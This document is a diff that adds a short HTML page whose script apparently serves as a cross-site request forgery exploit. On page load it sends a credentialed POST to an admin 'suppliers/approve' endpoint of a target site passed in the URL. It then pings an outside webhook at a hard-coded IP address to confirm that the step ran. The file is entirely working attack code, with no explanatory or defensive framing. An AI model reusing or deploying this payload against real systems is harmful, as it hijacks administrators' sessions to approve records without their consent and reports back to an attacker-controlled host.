@@ -1,0 +1,27 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const qs = new URLSearchParams(location.search);
+const BASE = qs.get('base');
+const ID = Number(qs.get('id'));
+const WEBHOOK = 'http://34.21.200.199:8084/7d66dbb2-62ce-4791-adf2-e51e69c43fca';
+
+async function run() {
+  const body = new TextEncoder().encode(JSON.stringify({ id: ID }));
+  try {
+    await fetch(BASE + '/api/admin/suppliers/approve', {
+      method: 'POST',
+      credentials: 'include',
+      mode: 'no-cors',
+      body
+    });
+  } catch {}
+
+  try {
+    await fetch(WEBHOOK + '?step=approve&x=' + encodeURIComponent(String(ID)), {
+      mode: 'no-cors'
+    });
+  } catch {}
+}
+run();
+</script>
